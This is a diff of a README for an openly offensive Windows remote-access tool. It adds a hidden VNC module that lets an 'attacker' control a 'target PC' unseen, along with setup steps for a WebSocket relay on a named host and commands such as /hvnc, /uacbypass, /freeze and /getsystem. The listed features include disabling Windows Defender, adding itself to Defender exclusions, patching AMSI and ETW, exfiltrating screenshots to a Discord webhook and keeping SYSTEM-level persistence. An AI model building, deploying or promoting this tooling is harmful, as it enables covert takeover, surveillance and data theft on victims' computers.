@@ -37,27 +37,31 @@
 **📡 Decentralized Communication**
 Uses public MQTT brokers (e.g., `broker.hivemq.com`) to orchestrate machines without requiring a centralized C2 server or port forwarding.
 
+**📺 Hidden VNC (hVNC) - v9.5 PRO**
+Interactive remote desktop on a completely hidden virtual desktop. No password required, zero user interaction or interruption. Control mouse and keyboard in the background. WebSocket-based relay for high-speed streaming at 1280x720 @ 20+ FPS with full keyboard and mouse control.
+
 **🛡️ Stealth UAC Bypass & Privilege Escalation**
-Internal stealth engine using `computerdefaults.exe` hijack. Silently elevates to **ROOT/Administrator** without spawning visible PowerShell commands or shell-based registry edits. [Read more here.](Security_Features.md#3-stealth-uac-bypass-privilege-escalation)
+Internal stealth engine using `computerdefaults.exe` hijack. Silently elevates to **ROOT/Administrator**.
+
+**🛡️ Auto-Exclusions (v6.6)**
+Automatically adds the installation directory and process to Windows Defender's exclusion list upon elevation, ensuring lifetime persistence.
 
 **👻 Deep Stealth & Evasion**
-- XOR-encrypted strings for all sensitive identifiers (API names, paths, URLs).
-- Anti-VM, Anti-Sandbox, and Analysis detection (MAC, BIOS, WMI, Process).
-- **UnDefend v2 (Defender Freeze):** Low-level NT API locking of Defender database files to blind real-time protection.
-- **Binary Self-Protection:** Internal kernel-level file locking to prevent AV deletion/quarantine while active.
+- XOR-encrypted strings for all sensitive identifiers.
+- Anti-VM, Anti-Sandbox, and Analysis detection.
+- **UnDefend v2 (Defender Freeze):** Low-level NT API locking.
+- **Binary Self-Protection:** Internal kernel-level file locking.
+- **Autonomous Binary:** Single-file standalone executable (v6.6).
 - AMSI and ETW runtime patching / bypass.
-- Junk code injection for hash and signature randomization.
-- Invisible background execution with deceptive naming (`WindowsUpdater.exe`).
-- Native `System` and `Hidden` file attributes.
 
 **📊 Real-time System Analytics**
-Visual live-updating UI (using WinForms overlaid on the CLI) for tracking CPU, RAM, Upload, and Download speeds.
+Visual live-updating UI for tracking CPU, RAM, Upload, and Download speeds.
 
 **📸 Discord Remote Screenshots**
 Instantly capture and exfiltrate screen captures directly to a Discord Webhook.
 
 **🔄 Auto-Persistence & ROOT Recovery**
-Patches the Windows Run Registry for automatic startup. Includes **Permanent ROOT Persistence** via high-integrity Scheduled Tasks, ensuring the suite reconnects as Administrator/SYSTEM automatically after a reboot. Seamless update mechanism with System Mutex handling to prevent duplicate instances.
+Includes **Permanent ROOT Persistence** via high-integrity Scheduled Tasks.
 
 <br />
 
@@ -86,6 +90,27 @@ cd Executor
 dotnet publish -c Release --runtime win-x64 --self-contained true -p:PublishSingleFile=true
 ```
 
+#### 4. Deploy the hVNC Relay Server
+The hVNC system requires a WebSocket relay server running on a dedicated host.
+
+**Recommended Host:** `katabump.com` (or any VPS with public IP)
+
+```bash
+# On the relay server host
+python3 relay_server.py
+```
+
+The relay server will:
+- Auto-install required dependencies (websockets)
+- Listen on `0.0.0.0:20113`
+- Relay VNC frames from Executor → Controller
+- Relay keyboard/mouse input from Controller → Executor
+
+**Update the relay server address in `Controller/Program.cs`:**
+```csharp
+private string RELAY_SERVER = "ws://YOUR_RELAY_HOST:20113";
+```
+
 <br />
 
 ---
@@ -96,6 +121,7 @@ dotnet publish -c Release --runtime win-x64 --self-contained true -p:PublishSing
 | :--- | :--- |
 | `mls` | Interactive visual menu to switch between targets. |
 | `/stats` | Opens live GUI charts for CPU, RAM, and Network. |
+| `/hvnc` | Launches high-speed hidden VNC viewer (1280x720 @ 20+ FPS). |
 | `/uacbypass` | Silently elevates privileges to ROOT/Administrator. |
 | `/freeze` | Manually triggers the UnDefend v2 Defender neutralization. |
 | `/getsystem` | Escalates to NT AUTHORITY\SYSTEM via stealthy Token Hijacking. |
@@ -108,7 +134,36 @@ dotnet publish -c Release --runtime win-x64 --self-contained true -p:PublishSing
 
 ---
 
-### 🛡️ Security Analysis
+### 🎮 hVNC (Hidden VNC) System
+
+**High-Speed Remote Desktop Control**
+
+The hVNC system provides interactive remote desktop access with:
+- **Resolution:** 1280x720 @ 20+ FPS
+- **Input:** Full keyboard (all keys) + mouse control
+- **Protocol:** WebSocket-based relay for low latency
+- **Stealth:** Runs on hidden virtual desktop, no user interruption
+
+**Architecture:**
+```
+Executor (Target PC)
+    ↓ (VNC Frames via WebSocket)
+Relay Server (katabump.com:20113)
+    ↓ (Frames via WebSocket)
+Controller (Attacker)
+    ↑ (Keyboard/Mouse Input via WebSocket)
+```
+
+**Keyboard Layout:**
+- Full QWERTY layout with all symbols
+- Function keys (F1-F12)
+- Navigation cluster (INS, HOME, PGUP, DEL, END, PGDN)
+- Arrow keys with proper scaling
+- All modifier keys (SHIFT, CTRL, ALT, WIN, MENU)
+
+<br />
+
+---
 **Detailed documentation on the integrated Anti-VM, Anti-AV, and Stealth mechanisms can be found in the [Security Features Guide](Security_Features.md).**
 
 <br />
